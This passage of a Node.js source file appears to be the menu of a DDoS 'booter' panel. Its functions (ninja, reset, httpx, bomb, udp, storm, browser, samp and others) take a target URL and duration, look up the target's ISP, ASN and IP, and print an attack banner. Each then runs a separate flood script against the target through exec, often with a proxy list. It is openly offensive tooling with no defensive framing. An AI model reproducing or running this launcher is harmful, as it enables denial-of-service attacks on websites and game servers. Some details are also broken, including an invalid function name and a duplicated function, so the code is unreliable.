\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m 
  \x1b[1;37mPlease After Attack Type \x1b[1;32m[ cls ]\x1b[1;37m To Return To The Home Menu \x1b[1;32m[ Note : Not Spam Attack ]\x1b[1;37m
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `HammzXTLS`);
exec(`node ${metode} ${target} ${duration} 100 10`)
sigma()
};
// [========================================] //
async function ninja(args) {
  if (args.length < 3) {
    console.log(`Example: .ninja <target>  <duration>
ninja https://contoh.com 60`);
    sigma();
	return
  }
 const [target, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`ATTACK SUCCESSFULLY SENT
         
\x1b[38;5;201m╔══════════════════════════════════════════════════════════════════╗\x1b[1m
\x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m NINJA \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m
\x1b[38;5;201m╔════════════════════════════════════════════════════════════════════╗\x1b[0m 
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m 
  \x1b[1;37mPlease After Attack Type \x1b[1;32m[ cls ]\x1b[1;37m To Return To The Home Menu \x1b[1;32m[ Note : Not Spam Attack ]\x1b[1;37m
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `HammzXNJA`);
exec(`node ${metode} ${target} ${duration}`)
sigma()
};
// [========================================] //
async function reset(args) {
  if (args.length < 3) {
    console.log(`Example: .reset <target>  <duration>
reset https://contoh.com 60`);
    sigma();
	return
  }
const [target, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`⠀ATTACK SUCCESSFULLY SENT
         
\x1b[38;5;201m╔══════════════════════════════════════════════════════════════════╗\x1b[1m
\x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m RESET \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m
\x1b[38;5;201m╔════════════════════════════════════════════════════════════════════╗\x1b[0m 
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m 
  \x1b[1;37mPlease After Attack Type \x1b[1;32m[ cls ]\x1b[1;37m To Return To The Home Menu \x1b[1;32m[ Note : Not Spam Attack ]\x1b[1;37m
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `HammzXRESET`);
exec(`node ${metode} ${target} ${duration} 32 10 proxy.txt`)
sigma()
};
// [========================================] //
async function resetv2(args) {
  if (args.length < 3) {
    console.log(`Example: .resetv2 <target>  <duration>
resetv2 https://contoh.com 60`);
    sigma();
	return
  }
const [target, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`⠀ATTACK SUCCESSFULLY SENT
         
\x1b[38;5;201m╔══════════════════════════════════════════════════════════════════╗\x1b[1m
\x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m RESETV2 \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m
\x1b[38;5;201m╔════════════════════════════════════════════════════════════════════╗\x1b[0m 
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m 
  \x1b[1;37mPlease After Attack Type \x1b[1;32m[ cls ]\x1b[1;37m To Return To The Home Menu \x1b[1;32m[ Note : Not Spam Attack ]\x1b[1;37m
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `HammzXRESETV2`);
exec(`node ${metode} ${target} ${duration} 32 8 proxy.txt`)
sigma()
};
// [========================================] //
async function httpx(args) {
  if (args.length < 3) {
    console.log(`Example: .httpx <target>  <duration>
httpx https://contoh.com 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`ATTACK SUCCESSFULLY SENT
         
\x1b[38;5;201m╔══════════════════════════════════════════════════════════════════╗\x1b[1m
\x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m HTTPX \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m
\x1b[38;5;201m╔════════════════════════════════════════════════════════════════════╗\x1b[0m 
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m 
  \x1b[1;37mPlease After Attack Type \x1b[1;32m[ cls ]\x1b[1;37m To Return To The Home Menu \x1b[1;32m[ Note : Not Spam Attack ]\x1b[1;37m
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `HammzXHTTPX`);
exec(`node ${metode} ${target} ${duration} 9 3 proxy.txt`)
sigma()
};
// [========================================] //
async function h2-vern(args) {
  if (args.length < 3) {
    console.log(`Example: .sigma <target> <duration>
sigma https://contoh.com 60`);
    sigma();
	return
  }
const [target, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`⠀ATTACK SUCCESSFULLY SENT
         
\x1b[38;5;201m╔══════════════════════════════════════════════════════════════════╗\x1b[1m
\x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m SIGMA \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m
\x1b[38;5;201m╔════════════════════════════════════════════════════════════════════╗\x1b[0m 
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m 
  \x1b[1;37mPlease After Attack Type \x1b[1;32m[ cls ]\x1b[1;37m To Return To The Home Menu \x1b[1;32m[ Note : Not Spam Attack ]\x1b[1;37m
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `HammzXH2-VERN`);
exec(`node ${metode} ${target} ${duration} 32 10 proxy.txt`)
sigma()
};
// [========================================] //
async function bomb(args) {
  if (args.length < 3) {
    console.log(`Example: .bomb <target>  <duration>
bomb https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`⠀ATTACK SUCCESSFULLY SENT
         
\x1b[38;5;201m╔══════════════════════════════════════════════════════════════════╗\x1b[1m
\x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m BOMB \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m
\x1b[38;5;201m╔════════════════════════════════════════════════════════════════════╗\x1b[0m 
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m 
  \x1b[1;37mPlease After Attack Type \x1b[1;32m[ cls ]\x1b[1;37m To Return To The Home Menu \x1b[1;32m[ Note : Not Spam Attack ]\x1b[1;37m
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `HammzXBOMB`);
exec(`node ${metode} ${target} ${duration} 64 10 proxy.txt`)
sigma()
};
// [========================================] //
async function raw(args) {
  if (args.length < 3) {
    console.log(`Example: .raw <target> <duration>
raw https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`⠀ATTACK SUCCESSFULLY SENT
         
\x1b[38;5;201m╔══════════════════════════════════════════════════════════════════╗\x1b[1m
\x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m RAW \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m
\x1b[38;5;201m╔════════════════════════════════════════════════════════════════════╗\x1b[0m 
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m 
  \x1b[1;37mPlease After Attack Type \x1b[1;32m[ cls ]\x1b[1;37m To Return To The Home Menu \x1b[1;32m[ Note : Not Spam Attack ]\x1b[1;37m
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `HammzXRAW`);
exec(`node ${metode} ${target} ${duration} 64 10 proxy.txt`)
sigma()
};
// [========================================] //
async function udp(args) {
  if (args.length < 3) {
    console.log(`Example: .udp <target> <port>  <duration>
udp https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`⠀ATTACK SUCCESSFULLY SENT
         
\x1b[38;5;201m╔══════════════════════════════════════════════════════════════════╗\x1b[1m
\x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m UDP \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m
\x1b[38;5;201m╔════════════════════════════════════════════════════════════════════╗\x1b[0m 
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m 
  \x1b[1;37mPlease After Attack Type \x1b[1;32m[ cls ]\x1b[1;37m To Return To The Home Menu \x1b[1;32m[ Note : Not Spam Attack ]\x1b[1;37m
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `9`);
exec(`node ${metode} ${target} ${port} ${duration} 32 10 proxy.txt`)
sigma()
};
// [========================================] //
async function h2(args) {
  if (args.length < 3) {
    console.log(`Example: .h2 <target> <duration>
h2 https://contoh.com 60`);
    sigma();
	return
  }
const [target, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`⠀ATTACK SUCCESSFULLY SENT
         
\x1b[38;5;201m╔══════════════════════════════════════════════════════════════════╗\x1b[1m
\x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m JAVA \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m
\x1b[38;5;201m╔════════════════════════════════════════════════════════════════════╗\x1b[0m 
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m 
  \x1b[1;37mPlease After Attack Type \x1b[1;32m[ cls ]\x1b[1;37m To Return To The Home Menu \x1b[1;32m[ Note : Not Spam Attack ]\x1b[1;37m
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `HammzXH2`);
exec(`node ${metode} ${target} ${duration} 32 10`)
sigma()
};
// [========================================] //
async function browser(args) {
  if (args.length < 3) {
    console.log(`Example: .strike <target>  <duration>
strike https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`⠀ATTACK SUCCESSFULLY SENT
         
\x1b[38;5;201m╔══════════════════════════════════════════════════════════════════╗\x1b[1m
\x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m STRIKE \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m
\x1b[38;5;201m╔════════════════════════════════════════════════════════════════════╗\x1b[0m 
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m 
  \x1b[1;37mPlease After Attack Type \x1b[1;32m[ cls ]\x1b[1;37m To Return To The Home Menu \x1b[1;32m[ Note : Not Spam Attack ]\x1b[1;37m
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `HammzXBROWSER`);
exec(`node ${metode} ${target} ${duration} 10 90 proxy.txt`)
sigma()
};
// [========================================] //
async function pluto(args) {
  if (args.length < 3) {
    console.log(`Example: .pluto <target> <port>  <duration>
pluto https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`ATTACK SUCCESSFULLY SENT
         
\x1b[38;5;201m╔══════════════════════════════════════════════════════════════════╗\x1b[1m
\x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m PLUTO \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m
\x1b[38;5;201m╔════════════════════════════════════════════════════════════════════╗\x1b[0m 
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m 
  \x1b[1;37mPlease After Attack Type \x1b[1;32m[ cls ]\x1b[1;37m To Return To The Home Menu \x1b[1;32m[ Note : Not Spam Attack ]\x1b[1;37m
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `12`);
exec(`node ${metode} ${target} ${duration} 32 10 proxy.txt`)
sigma()
};
// [========================================] //
async function storm(args) {
  if (args.length < 3) {
    console.log(`Example: .storm <target> <port>  <duration>
storm https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`ATTACK SUCCESSFULLY SENT
         
\x1b[38;5;201m╔══════════════════════════════════════════════════════════════════╗\x1b[1m
\x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m STORM \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m
\x1b[38;5;201m╔════════════════════════════════════════════════════════════════════╗\x1b[0m 
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m 
  \x1b[1;37mPlease After Attack Type \x1b[1;32m[ cls ]\x1b[1;37m To Return To The Home Menu \x1b[1;32m[ Note : Not Spam Attack ]\x1b[1;37m
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `13`);
exec(`node ${metode} ${target} ${duration} 32 10 proxy.txt`)
sigma()
};
// [========================================] //
async function raw(args) {
  if (args.length < 3) {
    console.log(`Example: .raw <target> <port>  <duration>
raw https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`ATTACK SUCCESSFULLY SENT
         
\x1b[38;5;201m╔══════════════════════════════════════════════════════════════════╗\x1b[1m
\x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m RAW \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m
\x1b[38;5;201m╔════════════════════════════════════════════════════════════════════╗\x1b[0m 
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m 
  \x1b[1;37mPlease After Attack Type \x1b[1;32m[ cls ]\x1b[1;37m To Return To The Home Menu \x1b[1;32m[ Note : Not Spam Attack ]\x1b[1;37m
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `14`);
exec(`node ${metode} ${target} ${duration}`)
sigma()
};
// [========================================] //
async function stars(args) {
  if (args.length < 3) {
    console.log(`Example: .stars <target> <port>  <duration>
flood https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`ATTACK SUCCESSFULLY SENT
         
\x1b[38;5;201m╔══════════════════════════════════════════════════════════════════╗\x1b[1m
\x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m STARS \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m
\x1b[38;5;201m╔════════════════════════════════════════════════════════════════════╗\x1b[0m 
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m 
  \x1b[1;37mPlease After Attack Type \x1b[1;32m[ cls ]\x1b[1;37m To Return To The Home Menu \x1b[1;32m[ Note : Not Spam Attack ]\x1b[1;37m
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `15`);
exec(`node ${metode} ${target} ${duration} 64 10 proxy.txt`)
sigma()
};
// [========================================] //
async function http1(args) {
  if (args.length < 3) {
    console.log(`Example: .http <target> <port>  <duration>
http1 https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`ATTACK SUCCESSFULLY SENT
         
\x1b[38;5;201m╔══════════════════════════════════════════════════════════════════╗\x1b[1m
\x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m HTTP1 \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m
\x1b[38;5;201m╔════════════════════════════════════════════════════════════════════╗\x1b[0m 
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m   \x1b[1;37mPlease After Attack Type \x1b[1;32m[ cls ]\x1b[1;37m To Return To The Home Menu \x1b[1;32m[ Note : Not Spam Attack ]\x1b[1;37m
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `16`);
exec(`node ${metode} ${target} ${duration}`)
sigma()
};
// [========================================] //
async function samp(args) {
  if (args.length < 3) {
    console.log(`Example: .samp <target> <port> <duration>
samp 123.456.78.910 7777 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
